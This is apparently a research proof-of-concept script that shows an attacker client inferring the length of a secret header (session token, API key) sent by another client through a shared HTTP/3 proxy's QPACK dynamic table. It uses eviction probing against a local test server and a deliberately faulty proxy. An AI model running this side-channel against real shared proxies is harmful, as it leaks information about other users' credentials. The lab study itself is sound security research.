"""Cross-client QPACK size oracle via eviction side-channel.

Demonstrates that an attacker client (A) can estimate the combined name+value
byte length of a header sent by a victim client (B) through the same HTTP/3
proxy, using only the QPACK eviction boundary as a signal.

How the attack works
--------------------
  1. Setup  — Client A fills the proxy's shared QPACK dynamic table with a
              canary entry + N uniquely-named filler entries, chosen so that
              only LEFTOVER < FILLER_SIZE bytes remain free.

  2. Victim — Client B sends a request with a secret header (victim_name,
              victim_value) unknown to Client A.  The proxy inserts this new
              entry into the shared table, evicting the oldest entries — the
              canary first, then fillers in order — until enough space is freed.

  3. Probe  — Client A probes backwards through its filler entries
              (newest → oldest).  Entries still in the table produce a
              "hit" (no encoder-stream instruction); evicted entries trigger
              a re-insertion instruction visible in the server's enc-stream log.
              Client A stops at the first miss.

  4. Estimate — Total evicted bytes = canary + (k+1 fillers, where k = index of
                first re-inserted filler).  That total bounds the victim entry's
                QPACK size from above.  Subtracting the 32-byte QPACK overhead
                gives the raw name+value byte range.

QPACK eviction math
-------------------
  entry_size = len(name) + len(value) + ENTRY_OVERHEAD  (RFC 9204 §3.2.1)

  After Client A's setup, the proxy's shared table holds:
      [canary, filler_0, filler_1, ..., filler_(N-1)]   (oldest → newest)
  with LEFTOVER bytes still free.

  Victim entry of size S evicts in insertion order until free_space >= S:
      free after evictions = LEFTOVER + CANARY_SIZE + K * FILLER_SIZE  >= S
  where K = number of filler entries evicted.

  Client A detects boundary at filler_(K-1) (first re-insertion going backwards):
      S ∈ (LEFTOVER + CANARY_SIZE + (K-1)*FILLER_SIZE,
           LEFTOVER + CANARY_SIZE +  K   *FILLER_SIZE]

  raw name+value bytes ∈ range above minus ENTRY_OVERHEAD.

Usage
-----
    cd aioquic_99
    python -m research.experiments.cross_client_size_probe <table_capacity>
        [--victim-name NAME] [--victim-value VALUE]

Examples
--------
    python -m research.experiments.cross_client_size_probe 512
    python -m research.experiments.cross_client_size_probe 512 \\
        --victim-name x-session-token --victim-value eyJhbGci
    python -m research.experiments.cross_client_size_probe 1024 \\
        --victim-name x-api-key --victim-value sk-1234567890abcdef
"""

from __future__ import annotations

import argparse
import asyncio
import itertools
import os
import random
import string
import sys
import socket
import ssl
from collections import deque
from typing import Generator

_HERE = os.path.dirname(os.path.abspath(__file__))
_REPO_ROOT = os.path.abspath(os.path.join(_HERE, "..", ".."))
if _REPO_ROOT not in sys.path:
    sys.path.insert(0, _REPO_ROOT)

from aioquic.asyncio.protocol import QuicConnectionProtocol
from aioquic.h3.connection import H3_ALPN, H3Connection, Setting
from aioquic.h3.events import H3Event
from aioquic.quic.configuration import QuicConfiguration
from aioquic.quic.connection import QuicConnection
from aioquic.quic.events import QuicEvent

from research.echo_server import EchoServer, EncStreamRecord
from research.faulty_proxy import FaultyProxy
from research.qpack_manual import ENTRY_OVERHEAD

# ---------------------------------------------------------------------------
# Paths
# ---------------------------------------------------------------------------

CERT = os.path.join(_HERE, "..", "..", "tests", "ssl_cert.pem")
KEY  = os.path.join(_HERE, "..", "..", "tests", "ssl_key.pem")

# Attacker's canary entry — placed at the oldest position so eviction is
# detectable.  1-byte name + empty value = 33 bytes (ENTRY_OVERHEAD + 1),
# the smallest valid QPACK entry, minimising the estimation range for the
# "only canary evicted" case (K=0).
CANARY_NAME  = b"z"
CANARY_VALUE = b""

# ---------------------------------------------------------------------------
# Table sizing — graduated fillers
# ---------------------------------------------------------------------------


def _entry_size(name: bytes, value: bytes) -> int:
    return len(name) + len(value) + ENTRY_OVERHEAD


def _filler_name_gen() -> Generator[bytes, None, None]:
    """Yield unique filler names in increasing-length order (a, b, …, y, aa, ab, …).

    All entries use empty values so entry_size = len(name) + ENTRY_OVERHEAD.
    Names are strictly alphabetic and exclude CANARY_NAME (b"z") so every name
    is unique and none collides with the canary.
    """
    for length in itertools.count(1):
        for chars in itertools.product(string.ascii_lowercase, repeat=length):
            name = "".join(chars).encode()
            if name != CANARY_NAME:
                yield name


def _compute_fillers(
    table_capacity: int,
) -> tuple[list[tuple[bytes, bytes]], int]:
    """Return (fillers, leftover_bytes).

    fillers is ordered oldest (index 0, smallest) → newest (index -1, largest).
    All filler values are b"" (empty).  Names increase in length so the oldest
    fillers are the smallest QPACK entries — the estimation precision equals the
    size of whichever filler sits at the eviction boundary.

    The final entry is size-adjusted to eliminate leftover space wherever
    possible (LEFTOVER = 0 for all practical table capacities).
    """
    canary_size = _entry_size(CANARY_NAME, CANARY_VALUE)
    remaining   = table_capacity - canary_size
    fillers: list[tuple[bytes, bytes]] = []
    used: set[bytes] = {CANARY_NAME}

    for name in _filler_name_gen():
        size  = len(name) + ENTRY_OVERHEAD  # value = b""
        after = remaining - size

        if size > remaining:
            # Entry too large; fall through to exact-fill.
            break

        if 0 < after < ENTRY_OVERHEAD + 1:
            # Adding this would strand < 33 bytes — too small for any valid
            # QPACK entry — so stop here and exact-fill instead.
            break

        fillers.append((name, b""))
        used.add(name)
        remaining -= size

        if remaining == 0:
            return fillers, 0

    # Exact-fill: one final entry whose name length = remaining - ENTRY_OVERHEAD,
    # consuming the leftover bytes exactly.
    if remaining >= ENTRY_OVERHEAD + 1:
        exact_len = remaining - ENTRY_OVERHEAD
        for chars in itertools.product(string.ascii_lowercase, repeat=exact_len):
            cname = "".join(chars).encode()
            if cname not in used:
                fillers.append((cname, b""))
                remaining = 0
                break

    return fillers, remaining


# ---------------------------------------------------------------------------
# Encoder-stream insertion detection
# ---------------------------------------------------------------------------


def _count_literal_insertions(
    enc_log: list[EncStreamRecord], name: bytes, value: bytes
) -> int:
    """Count insert_literal instructions matching (name, value) in enc_log.

    We check insert_literal specifically because all headers in this experiment
    have unique names that are absent from the static table and absent from the
    dynamic table at the time of insertion (either initial or after eviction),
    so the encoder always uses insert_literal rather than insert_name_ref.
    """
    count = 0
    for record in enc_log:
        for instr in record.instructions:
            if (
                instr[0] == "insert_literal"
                and instr[1] == name
                and instr[2] == value
            ):
                count += 1
    return count


# ---------------------------------------------------------------------------
# Minimal HTTP/3 client (zero dynamic table — attacker sends only literals)
# ---------------------------------------------------------------------------


class _ZeroCapEncoder:
    """Wraps pylsqpack.Encoder, forcing 0-capacity settings so the client
    never uses its own dynamic table and doesn't pollute the proxy's shared
    encoder state with ack signals."""

    def __init__(self, real) -> None:
        object.__setattr__(self, "_real", real)

    def apply_settings(self, *args, **kwargs) -> bytes:  # noqa: ARG002
        return self._real.apply_settings(0, 0)

    def feed_decoder(self, *args, **kwargs) -> None:  # noqa: ARG002
        pass

    def __getattr__(self, name: str):
        return getattr(self._real, name)


class _NoTableH3Connection(H3Connection):
    def __init__(self, quic) -> None:
        super().__init__(quic)
        self._encoder = _ZeroCapEncoder(self._encoder)

    def _get_local_settings(self) -> dict:
        settings = super()._get_local_settings()
        settings[Setting.QPACK_MAX_TABLE_CAPACITY] = 0
        settings[Setting.QPACK_BLOCKED_STREAMS] = 0
        return settings


class _H3Client(QuicConnectionProtocol):
    """Minimal HTTP/3 client that fires GET requests and waits for responses."""

    def __init__(self, *args, **kwargs) -> None:
        super().__init__(*args, **kwargs)
        self._request_events: dict[int, deque[H3Event]] = {}
        self._request_waiters: dict[int, asyncio.Future] = {}
        self._http: H3Connection = _NoTableH3Connection(self._quic)

    def quic_event_received(self, event: QuicEvent) -> None:
        for h3ev in self._http.handle_event(event):
            sid = h3ev.stream_id  # type: ignore[attr-defined]
            self._request_events.setdefault(sid, deque()).append(h3ev)
            if getattr(h3ev, "stream_ended", False) and sid in self._request_waiters:
                waiter = self._request_waiters.pop(sid)
                if not waiter.done():
                    waiter.set_result(self._request_events.pop(sid))

    async def get(
        self,
        host: str,
        port: int,
        path: str,
        extra_headers: list[tuple[bytes, bytes]] | None = None,
    ) -> deque[H3Event]:
        headers = [
            (b":method",    b"GET"),
            (b":scheme",    b"https"),
            (b":authority", f"{host}:{port}".encode()),
            (b":path",      path.encode()),
        ]
        if extra_headers:
            headers.extend(extra_headers)
        sid = self._quic.get_next_available_stream_id()
        self._http.send_headers(stream_id=sid, headers=headers, end_stream=True)
        waiter = self._loop.create_future()
        self._request_events[sid] = deque()
        self._request_waiters[sid] = waiter
        self.transmit()
        return await asyncio.wait_for(asyncio.shield(waiter), timeout=10.0)


async def _connect_client(
    host: str, port: int
) -> tuple[_H3Client, asyncio.BaseTransport]:
    loop = asyncio.get_running_loop()
    infos = await loop.getaddrinfo(host, port, type=socket.SOCK_DGRAM)
    addr = infos[0][4]
    if len(addr) == 2:
        addr = ("::ffff:" + addr[0], addr[1], 0, 0)

    config = QuicConfiguration(is_client=True, alpn_protocols=H3_ALPN)
    config.verify_mode = ssl.CERT_NONE
    config.server_name = host

    sock = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
    try:
        sock.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_V6ONLY, 0)
        sock.bind(("::", 0, 0, 0))
    except Exception:
        sock.close()
        raise

    transport, protocol = await loop.create_datagram_endpoint(
        lambda: _H3Client(QuicConnection(configuration=config)),
        sock=sock,
    )
    protocol.connect(addr)
    await protocol.wait_connected()
    return protocol, transport


# ---------------------------------------------------------------------------
# Experiment
# ---------------------------------------------------------------------------


async def run(
    table_capacity: int,
    victim_name: bytes,
    victim_value: bytes,
) -> None:
    canary_size = _entry_size(CANARY_NAME, CANARY_VALUE)
    fillers, leftover = _compute_fillers(table_capacity)

    if not fillers:
        min_filler = 1 + ENTRY_OVERHEAD  # 1-byte name, empty value
        print(
            f"ERROR: table_capacity={table_capacity} is too small to hold canary "
            f"({canary_size} bytes) plus any filler ({min_filler} bytes).  "
            f"Minimum table size: {canary_size + min_filler} bytes."
        )
        return

    filler_sizes = [len(name) + ENTRY_OVERHEAD for name, _ in fillers]
    cumsum       = list(itertools.accumulate(filler_sizes))
    total_filler = cumsum[-1]
    used_bytes   = canary_size + total_filler

    victim_entry_size = _entry_size(victim_name, victim_value)
    victim_nv_len     = len(victim_name) + len(victim_value)

    W = 78
    print("=" * W)
    print(f"CROSS-CLIENT QPACK SIZE ORACLE  (table={table_capacity} bytes)")
    print("=" * W)
    print()
    print("Table layout (attacker's view):")
    print(f"  Canary  : {CANARY_NAME.decode()!r:25s}  {canary_size:4d} bytes  (minimum QPACK entry)")
    print(f"  Fillers : {len(fillers)} entries, sizes "
          f"{min(filler_sizes)}–{max(filler_sizes)} bytes  "
          f"(graduated, oldest = smallest, all empty-value)")
    print(f"  Total   : {used_bytes}/{table_capacity} bytes used  "
          f"({leftover} bytes leftover)")
    print()
    print(f"Victim header (unknown to attacker):")
    print(f"  {victim_name.decode()}: {victim_value.decode()}")
    print(f"  QPACK entry size : {victim_entry_size} bytes  "
          f"({victim_nv_len} name+value  +  {ENTRY_OVERHEAD} overhead)")
    print()

    # ── Infrastructure setup ─────────────────────────────────────────────────
    server = EchoServer()
    proxy  = FaultyProxy(table_capacity=table_capacity)
    echo_port  = await server.start(cert_file=CERT, key_file=KEY)
    proxy_port = await proxy.start(
        listen_port=0,
        backend_host="localhost",
        backend_port=echo_port,
        cert_file=CERT,
        key_file=KEY,
    )

    client_a, transport_a = await _connect_client("localhost", proxy_port)
    client_b, transport_b = await _connect_client("localhost", proxy_port)

    try:
        # ── Phase 1: Setup ───────────────────────────────────────────────────
        print("Phase 1: Setup  [Client A fills the shared table]")
        print("─" * W)

        await client_a.get("localhost", proxy_port, "/setup/canary",
                           extra_headers=[(CANARY_NAME, CANARY_VALUE)])
        if _count_literal_insertions(server.get_enc_log(), CANARY_NAME, CANARY_VALUE) != 1:
            print("  ERROR: canary not confirmed in encoder stream. Aborting.")
            return
        print(f"  [1/2] Canary: {CANARY_NAME.decode()!r} = {CANARY_VALUE.decode()!r}  "
              f"({canary_size} bytes)")

        for i, (fname, fval) in enumerate(fillers):
            await client_a.get("localhost", proxy_port, f"/setup/filler/{i}",
                               extra_headers=[(fname, fval)])

        print(f"  [2/2] Fillers: {len(fillers)} entries  "
              f"({fillers[0][0].decode()!r}…{fillers[-1][0].decode()!r})  "
              f"sizes {min(filler_sizes)}–{max(filler_sizes)} B  =  {total_filler} bytes")
        print(f"        Table : {used_bytes}/{table_capacity} bytes used  "
              f"({leftover} bytes free)")
        print()

        # ── Phase 2: Victim ──────────────────────────────────────────────────
        print("Phase 2: Victim  [Client B sends mystery header through shared proxy]")
        print("─" * W)

        if victim_entry_size > table_capacity:
            print(f"  WARNING: victim entry ({victim_entry_size} bytes) exceeds table capacity "
                  f"({table_capacity} bytes).  Proxy will NOT insert it — no eviction will occur.")
            print("  Reduce victim header size or increase table capacity.")
            return

        enc_before = _count_literal_insertions(server.get_enc_log(), victim_name, victim_value)
        await client_b.get("localhost", proxy_port, "/victim/request",
                           extra_headers=[(victim_name, victim_value)])
        enc_after = _count_literal_insertions(server.get_enc_log(), victim_name, victim_value)

        if enc_after <= enc_before:
            print(f"  WARNING: victim header was not inserted by the proxy.  "
                  f"(May already be in the dynamic or static table.)")
            print("  Try a different --victim-name / --victim-value.")
            return

        print(f"  Victim header forwarded; proxy inserted into shared table.")
        print()

        # ── Phase 3: Probe ───────────────────────────────────────────────────
        print("Phase 3: Probe  [Client A scans backwards: newest → oldest filler]")
        print("─" * W)

        evicted_boundary: int | None = None
        probes_sent = 0

        for j in range(len(fillers) - 1, -1, -1):
            fname, fval = fillers[j]
            cnt_before = _count_literal_insertions(server.get_enc_log(), fname, fval)
            await client_a.get("localhost", proxy_port, f"/probe/filler/{j}",
                               extra_headers=[(fname, fval)])
            cnt_after = _count_literal_insertions(server.get_enc_log(), fname, fval)
            probes_sent += 1

            if cnt_after > cnt_before:
                hits_above = len(fillers) - 1 - j
                if hits_above:
                    print(f"  hit   [{len(fillers)-1}..{j+1}]  "
                          f"({hits_above} entr{'y' if hits_above == 1 else 'ies'} "
                          f"still in table, "
                          f"{filler_sizes[j+1]}–{filler_sizes[-1]} B)")
                print(f"  MISS  [{j}] {fname.decode()!r}  ({filler_sizes[j]} B)  "
                      f"← eviction boundary  ({probes_sent} probe(s) sent)")
                evicted_boundary = j
                break

        only_canary_evicted = False
        if evicted_boundary is None:
            if fillers:
                print(f"  hit   [all {len(fillers)} fillers]  "
                      f"({filler_sizes[0]}–{filler_sizes[-1]} B, all still in table)")
            can_before = _count_literal_insertions(server.get_enc_log(), CANARY_NAME, CANARY_VALUE)
            await client_a.get("localhost", proxy_port, "/probe/canary",
                               extra_headers=[(CANARY_NAME, CANARY_VALUE)])
            can_after = _count_literal_insertions(server.get_enc_log(), CANARY_NAME, CANARY_VALUE)
            probes_sent += 1

            if can_after > can_before:
                only_canary_evicted = True
                print(f"  MISS  canary {CANARY_NAME.decode()!r}  ({canary_size} B)  "
                      f"← eviction boundary  ({probes_sent} probe(s) sent)")
            else:
                print(f"  hit   canary {CANARY_NAME.decode()!r}  (nothing evicted)")

        print()

        # ── Phase 4: Estimation ──────────────────────────────────────────────
        print("Phase 4: Estimation  [attacker infers victim header size]")
        print("─" * W)

        if evicted_boundary is not None:
            j = evicted_boundary
            boundary_size    = filler_sizes[j]
            evicted_filler_b = cumsum[j]          # sum of filler sizes 0..j
            evicted_bytes    = canary_size + evicted_filler_b
            s_upper          = leftover + canary_size + cumsum[j]
            s_lower          = leftover + canary_size + (cumsum[j-1] if j > 0 else 0) + 1
            evicted_desc     = (
                f"canary ({canary_size} B)  +  {j+1} filler(s)  "
                f"[0..{j}]  ({evicted_filler_b} B total)"
            )
        elif only_canary_evicted:
            boundary_size = canary_size
            evicted_bytes = canary_size
            s_upper       = leftover + canary_size
            s_lower       = leftover + 1
            evicted_desc  = f"canary only ({canary_size} B)"
        else:
            boundary_size = 0
            evicted_bytes = 0
            s_upper       = leftover
            s_lower       = 0
            evicted_desc  = "none — victim header fit in leftover space"

        nv_upper = s_upper - ENTRY_OVERHEAD
        nv_lower = max(0, s_lower - ENTRY_OVERHEAD)

        print(f"  Evicted            : {evicted_desc}")
        print(f"  Total evicted bytes: {evicted_bytes}  "
              f"(leftover={leftover}  +  canary={canary_size}  +  fillers={evicted_bytes - canary_size})")
        print()
        print(f"  ┌─ Estimated QPACK entry size ─────────────── [{s_lower}, {s_upper}] bytes")
        print(f"  └─ Estimated name+value length ─────────────  [{nv_lower}, {nv_upper}] bytes")
        print(f"     Resolution : {boundary_size} bytes  (size of boundary entry)")
        print()
        print(f"  ── Verification ──────────────────────────────────────────────────")
        print(f"     Actual QPACK entry size : {victim_entry_size} bytes")
        print(f"     Actual name+value bytes : {victim_nv_len} bytes")
        in_range = s_lower <= victim_entry_size <= s_upper
        print(f"     In estimated range      : {'YES  (oracle correct)' if in_range else 'NO  ← bug in probe logic'}")
        if in_range:
            mid = (s_lower + s_upper) / 2
            error = abs(victim_entry_size - mid)
            print(f"     Error vs. midpoint      : {error:.1f} bytes  "
                  f"(midpoint = {mid:.1f}, range width = {boundary_size} bytes)")
        print()

    finally:
        client_a.close()
        transport_a.close()
        client_b.close()
        transport_b.close()
        proxy.stop()
        server.close()


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------


_VICTIM_NAMES = ["x-session-token", "x-api-key"]
_VALUE_CHARS  = string.ascii_letters + string.digits


def _random_victim() -> tuple[str, str]:
    name  = random.choice(_VICTIM_NAMES)
    value = "".join(random.choices(_VALUE_CHARS, k=random.randint(10, 30)))
    return name, value


def main() -> None:
    default_name, default_value = _random_victim()

    parser = argparse.ArgumentParser(
        description="QPACK cross-client header-size oracle via eviction side-channel",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
examples:
  python -m research.experiments.cross_client_size_probe
  python -m research.experiments.cross_client_size_probe --table-capacity 512
  python -m research.experiments.cross_client_size_probe --victim-name x-api-key --victim-value sk-abc123
        """,
    )
    parser.add_argument(
        "--table-capacity",
        type=int,
        default=4096,
        help="QPACK dynamic table capacity in bytes (default: 4096)",
    )
    parser.add_argument(
        "--victim-name",
        default=default_name,
        help=f"Victim header field name (default: random choice from {_VICTIM_NAMES})",
    )
    parser.add_argument(
        "--victim-value",
        default=default_value,
        help="Victim header field value (default: random 10-30 char alphanumeric string)",
    )
    args = parser.parse_args()
    asyncio.run(run(
        table_capacity=args.table_capacity,
        victim_name=args.victim_name.encode(),
        victim_value=args.victim_value.encode(),
    ))


if __name__ == "__main__":
    main()
